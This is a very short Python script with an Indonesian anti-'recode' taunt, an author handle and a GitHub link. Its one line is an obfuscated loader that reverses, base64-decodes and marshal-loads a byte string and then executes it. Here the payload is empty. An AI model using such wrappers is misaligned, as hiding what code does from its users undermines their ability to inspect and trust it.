# "CIEE MAU RECODE YA!"
# "Code By KangSantuy"
# "Github : https://github.com/e52x"
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))
